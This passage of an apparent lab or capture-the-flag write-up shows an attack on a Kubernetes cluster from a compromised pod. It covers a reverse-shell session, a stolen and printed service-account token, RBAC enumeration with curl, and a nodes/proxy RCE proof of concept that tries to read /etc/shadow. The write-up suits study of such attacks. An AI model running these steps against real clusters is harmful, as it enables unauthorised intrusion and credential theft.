+/usr/local/bin/python3
+mcp@mcp-server-54464cb475-29ztf:/app$ which python
+/usr/local/bin/python
+mcp@mcp-server-54464cb475-29ztf:/app$ 
+```
+
+And here we go, let's install our `kubectl_min.py`:
+
+```
+(Penelope)─(Session [1])> upload /tmp/kubectl_min.py
+[•] ⇥ Uploading to /tmp
+ ⤷ •••••••••••••••••••••••••••••• 100% (35.1 KB/35.1 KB) | Elapsed 0:00:00
+[+] Uploaded /tmp/kubectl_min.py
+
+(Penelope)─(Session [1])> interact
+mcp@mcp-server-54464cb475-29ztf:/tmp$ ls
+kubectl_min.py
+mcp@mcp-server-54464cb475-29ztf:/tmp$ 
+```
+
+As we haven't the `/home/mcp/.kube/config` file, we can use this secondary authentication method, provided by the gist:
+
+```bash
+export KUBE_SERVER="https://10.0.0.1:6443"
+export KUBE_TOKEN="eyJhbGciOi..."
+export KUBE_CA_CERT_FILE="/etc/certs/ca.crt"
+./kubectl_min.py get pods -n default
+```
+
+So I just setted my vars:
+
+```bash
+mcp@mcp-server-54464cb475-29ztf:/tmp$ export KUBE_SERVER="https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"
+mcp@mcp-server-54464cb475-29ztf:/tmp$ echo $KUBE_SERVER 
+https://10.43.0.1:443
+mcp@mcp-server-54464cb475-29ztf:/tmp$ export KUBE_TOKEN="$TOKEN"
+mcp@mcp-server-54464cb475-29ztf:/tmp$ echo $KUBE_TOKEN 
+eyJhbGciOiJSUzI1NiIsImtpZCI6ImFQRTZ5R3JrSUpadmdid19HcHBTRTBYUFJZWUxqeGcxUHJIaFJjTEVSdm8ifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxODE5MzkxMTg2LCJpYXQiOjE3ODc4NTUxODYsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiY2VhNGFlMWItN2IxZS00ODAwLTlmYWItYWJmZjQ1NDIxNjg1Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0Iiwibm9kZSI6eyJuYW1lIjoiZmlyZWZsb3ciLCJ1aWQiOiI4NzI5MTU4OC0wMTc4LTRlNDItYTk5OC00MWE1MmZhNzNiOGUifSwicG9kIjp7Im5hbWUiOiJtY3Atc2VydmVyLTU0NDY0Y2I0NzUtMjl6dGYiLCJ1aWQiOiI3MDJhZmViYi00ZjUxLTRlZDUtYWE5OC1hYjZiMjU1M2E3MjgifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6Im1jcC1zYSIsInVpZCI6ImE1MzRmNTUxLWIyYjEtNGU2Ni1iZGE1LWU5YjVlMmE1NjAyYyJ9LCJ3YXJuYWZ0ZXIiOjE3ODc4NTg3OTN9LCJuYmYiOjE3ODc4NTUxODYsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0Om1jcC1zYSJ9.GCrRDpKWdUAeGkhlNJHQQ-fFebJSBeZxfWJs5hmuPs8wE07axHFkAAMY81vL8Ay3lpA7lnmP0WNYSUzWoeVCs1hX6dmiDo0yMuUT8hCbRV2_c7oZXOUb4TpkhfRkuQ-wpWuZqVf6sBF0X5b0MwaaVGO8RnFzNQnA_hKqku8ErSmPItCbrcIsoE9nFis9iYes6ijwKCcOXZXvZFXPVSDaRCSFmO0CEOSjmzTPYrfF6j4k-5jZVxtOW1wsJNQt8YMPhuWm8K8HCfzM0Ue8VOWHdR2-Xun8huXpxnOlbXblLZTcMO0RyOcvFPCSh-4IgpsDz2M2Dtj4p9Pg9_Kzij35YA
+mcp@mcp-server-54464cb475-29ztf:/tmp$ export KUBE_CA_CERT_FILE="$CA"
+mcp@mcp-server-54464cb475-29ztf:/tmp$ echo $KUBE_CA_CERT_FILE 
+/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+mcp@mcp-server-54464cb475-29ztf:/tmp$ 
+```
+
+And then keep enumerating:
+
+```
+mcp@mcp-server-54464cb475-29ztf:/tmp$ ./kubectl_min.py get ns
+error: HTTP 403: namespaces is forbidden: User "system:serviceaccount:default:mcp-sa" cannot list resource "namespaces" in API group "" at the cluster scope
+mcp@mcp-server-54464cb475-29ztf:/tmp$ ./kubectl_min.py get pods
+error: HTTP 403: pods is forbidden: User "system:serviceaccount:default:mcp-sa" cannot list resource "pods" in API group "" in the namespace "default"
+mcp@mcp-server-54464cb475-29ztf:/tmp$ ./kubectl_min.py get namespaces
+error: HTTP 403: namespaces is forbidden: User "system:serviceaccount:default:mcp-sa" cannot list resource "namespaces" in API group "" at the cluster scope
+mcp@mcp-server-54464cb475-29ztf:/tmp$ ./kubectl_min.py get pods -A
+error: HTTP 403: pods is forbidden: User "system:serviceaccount:default:mcp-sa" cannot list resource "pods" in API group "" at the cluster scope
+mcp@mcp-server-54464cb475-29ztf:/tmp$ ./kubectl_min.py get deployments
+error: HTTP 403: deployments.apps is forbidden: User "system:serviceaccount:default:mcp-sa" cannot list resource "deployments" in API group "apps" in the namespace "default"
+mcp@mcp-server-54464cb475-29ztf:/tmp$ ./kubectl_min.py get pods -n default
+error: HTTP 403: pods is forbidden: User "system:serviceaccount:default:mcp-sa" cannot list resource "pods" in API group "" in the namespace "default"
+mcp@mcp-server-54464cb475-29ztf:/tmp$ ./kubectl_min.py get serviceaccounts -A
+error: HTTP 403: serviceaccounts is forbidden: User "system:serviceaccount:default:mcp-sa" cannot list resource "serviceaccounts" in API group "" at the cluster scope
+mcp@mcp-server-54464cb475-29ztf:/tmp$
+```
+
+Unfortunately I just get a bunch of _Forbidden_ errors, that basically says "Your user `system:xxx:mcp-sa` can't list `xxx` in API Group `xxx`". I asked claude for a api path python standalone interactive ctl, while he isn't done I'll check some endpoints manually. First of all I'll set the `$API` environment variable:
+
+```
+mcp@mcp-server-54464cb475-29ztf:~$ export API="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
+mcp@mcp-server-54464cb475-29ztf:~$ echo $API
+https://10.43.0.1:443
+mcp@mcp-server-54464cb475-29ztf:~$ 
+```
+
+And then:
+
+```bash
+mcp@mcp-server-54464cb475-29ztf:~$ curl --cacert "$CA" \
+  -H "Authorization: Bearer $TOKEN" \
+  "$API/version"
+{
+  "major": "1",
+  "minor": "34",
+  "emulationMajor": "1",
+  "emulationMinor": "34",
+  "minCompatibilityMajor": "1",
+  "minCompatibilityMinor": "33",
+  "gitVersion": "v1.34.6+k3s1",
+  "gitCommit": "234e61326ca4e005522be1e69645c1ca5754121f",
+  "gitTreeState": "clean",
+  "buildDate": "2026-03-28T03:22:26Z",
+  "goVersion": "go1.24.13",
+  "compiler": "gc",
+  "platform": "linux/amd64"
+mcp@mcp-server-54464cb475-29ztf:~$ curl --cacert "$CA" \\
+  -H "Authorization: Bearer $TOKEN" \
+  "$API/api"
+{
+  "kind": "APIVersions",
+  "versions": [
+    "v1"
+  ],
+  "serverAddressByClientCIDRs": [
+    {
+      "clientCIDR": "0.0.0.0/0",
+      "serverAddress": "10.129.94.204:6443"
+    }
+  ]
+}
+mcp@mcp-server-54464cb475-29ztf:~$
+```
+
+Now I need to set the `$NS` env var (stands for namespace), that can be found at `/var/run/secrets/kubernetes.io/serviceaccount/namespace`:
+
+```bash
+mcp@mcp-server-54464cb475-29ztf:~$ NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace))
+mcp@mcp-server-54464cb475-29ztf:~$ echo "$NS"
+default
+mcp@mcp-server-54464cb475-29ztf:~$
+```
+
+And then, I'll try to enumerate pods through the endpoint `GET $API/api/v1/namespaces/$NS/pods`:
+
+```bash
+mcp@mcp-server-54464cb475-29ztf:~$ curl -s --cacert "$CA" \
+  -H "Authorization: Bearer $TOKEN" \
+  "$API/api/v1/namespaces/$NS/pods"
+{
+  "kind": "Status",
+  "apiVersion": "v1",
+  "metadata": {},
+  "status": "Failure",
+  "message": "pods is forbidden: User \"system:serviceaccount:default:mcp-sa\" cannot list resource \"pods\" in API group \"\" in the namespace \"default\"",
+  "reason": "Forbidden",
+  "details": {
+    "kind": "pods"
+  },
+  "code": 403
+}
+mcp@mcp-server-54464cb475-29ztf:~$ 
+```
+
+Another `403`, I'll check the `userinfo` endpoint:
+
+```bash
+mcp@mcp-server-54464cb475-29ztf:~$ curl -s --cacert "$CA" \
+  -H "Authorization: Bearer $TOKEN" \
+  "$API/apis/authentication.k8s.io/v1/userinfo"
+{
+  "kind": "Status",
+  "apiVersion": "v1",
+  "metadata": {},
+  "status": "Failure",
+  "message": "userinfo.authentication.k8s.io is forbidden: User \"system:serviceaccount:default:mcp-sa\" cannot list resource \"userinfo\" in API group \"authentication.k8s.io\" at the cluster scope",
+  "reason": "Forbidden",
+  "details": {
+    "group": "authentication.k8s.io",
+    "kind": "userinfo"
+  },
+  "code": 403
+}
+mcp@mcp-server-54464cb475-29ztf:~$ 
+```
+
+As everything returns forbidden, I don't even need the claude's standalone. I'll just try another way: `POST` requests:
+
+```bash
+mcp@mcp-server-54464cb475-29ztf:/tmp$ curl -sk -X POST $API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'
+{
+  "kind": "SelfSubjectRulesReview",
+  "apiVersion": "authorization.k8s.io/v1",
+  "metadata": {},
+  "spec": {},
+  "status": {
+    "resourceRules": [
+      {
+        "verbs": [
+          "create"
+        ],
+        "apiGroups": [
+          "authorization.k8s.io"
+        ],
+        "resources": [
+          "selfsubjectaccessreviews",
+          "selfsubjectrulesreviews"
+        ]
+      },
+      {
+        "verbs": [
+          "create"
+        ],
+        "apiGroups": [
+          "authentication.k8s.io"
+        ],
+        "resources": [
+          "selfsubjectreviews"
+        ]
+      },
+      {
+        "verbs": [
+          "get"
+        ],
+        "apiGroups": [
+          ""
+        ],
+        "resources": [
+          "nodes/proxy"
+        ]
+      }
+    ],
+    "nonResourceRules": [
+      {
+        "verbs": [
+          "get"
+        ],
+        "nonResourceURLs": [
+          "/api",
+          "/api/*",
+          "/apis",
+          "/apis/*",
+          "/healthz",
+          "/livez",
+          "/openapi",
+          "/openapi/*",
+          "/readyz",
+          "/version",
+          "/version/"
+        ]
+      },
+      {
+        "verbs": [
+          "get"
+        ],
+        "nonResourceURLs": [
+          "/.well-known/openid-configuration",
+          "/.well-known/openid-configuration/",
+          "/openid/v1/jwks",
+          "/openid/v1/jwks/"
+        ]
+      },
+      {
+        "verbs": [
+          "get"
+        ],
+        "nonResourceURLs": [
+          "/healthz",
+          "/livez",
+          "/readyz",
+          "/version",
+          "/version/"
+        ]
+      }
+    ],
+    "incomplete": false
+  }
+}
+mcp@mcp-server-54464cb475-29ztf:/tmp$ 
+```
+
+And here we go. Now I'll test the [api-only python standalone](https://gist.githubusercontent.com/Yyax13/93fe0b8a2a0c952b990cf96d89bdcff7/raw/db9aa7d11217dbd4e40d8645c80849a6a538117b/kubectl_api_only.py) for an easier interaction:
+
+```
+mcp@mcp-server-54464cb475-29ztf:/tmp$ ./kubectl_api_only.py \
+  "POST /apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
+  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'
+HTTP 201
+{
+  "kind": "SelfSubjectRulesReview",
+  "apiVersion": "authorization.k8s.io/v1",
+  "metadata": {},
+  "spec": {},
+  "status": {
+    "resourceRules": [
+      {
+        "verbs": [
+          "get"
+        ],
+        "apiGroups": [
+          ""
+        ],
+        "resources": [
+          "nodes/proxy"
+        ]
+      },
+      {
+        "verbs": [
+          "create"
+        ],
+        "apiGroups": [
+          "authorization.k8s.io"
+        ],
+        "resources": [
+          "selfsubjectaccessreviews",
+          "selfsubjectrulesreviews"
+        ]
+      },
+      {
+        "verbs": [
+          "create"
+        ],
+        "apiGroups": [
+          "authentication.k8s.io"
+        ],
+        "resources": [
+          "selfsubjectreviews"
+        ]
+      }
+    ],
+    "nonResourceRules": [
+      {
+        "verbs": [
+          "get"
+        ],
+        "nonResourceURLs": [
+          "/.well-known/openid-configuration",
+          "/.well-known/openid-configuration/",
+          "/openid/v1/jwks",
+          "/openid/v1/jwks/"
+        ]
+      },
+      {
+        "verbs": [
+          "get"
+        ],
+        "nonResourceURLs": [
+          "/healthz",
+          "/livez",
+          "/readyz",
+          "/version",
+          "/version/"
+        ]
+      },
+      {
+        "verbs": [
+          "get"
+        ],
+        "nonResourceURLs": [
+          "/api",
+          "/api/*",
+          "/apis",
+          "/apis/*",
+          "/healthz",
+          "/livez",
+          "/openapi",
+          "/openapi/*",
+          "/readyz",
+          "/version",
+          "/version/"
+        ]
+      }
+    ],
+    "incomplete": false
+  }
+}
+mcp@mcp-server-54464cb475-29ztf:/tmp$ 
+```
+
+And here we go.
+
+## Exploiting `nodes/proxy` Kubernetes Resource to RCE in any Pod
+
+The `nodes/proxy` resource is well-known for RCE (check https://labs.iximiuz.com/tutorials/nodes-proxy-rce-c9e436a9 and/or https://grahamhelton.com/blog/nodes-proxy-rce for more information). The first thing that I did was executing a PoC for this well-known escape (from https://grahamhelton.com/blog/nodes-proxy-rce#proof-of-concept).
+
+I needed a `NODE_IP` environment variable (which is probably the host IP), so I set it:
+
+```
+mcp@mcp-server-54464cb475-29ztf:/tmp$ export NODE_IP="10.129.94.204"
+mcp@mcp-server-54464cb475-29ztf:/tmp$ 
+```
+
+After this I just executed the file:
+
+```
+mcp@mcp-server-54464cb475-29ztf:/tmp$ ./escape.sh 
+
+[+] Target: 10.129.94.204:10250
+[+] Pod: default/nginx
+
+[~>] Fetching hostname...
+[+] Hostname: 
+
+[~>] Fetching identity...
+[+] Identity: 
+
+[~>] Attempting to read /etc/shadow...
+[!] Could not read /etc/shadow
+mcp@mcp-server-54464cb475-29ztf:/tmp$ 
+```
+
+
+
 
 ---
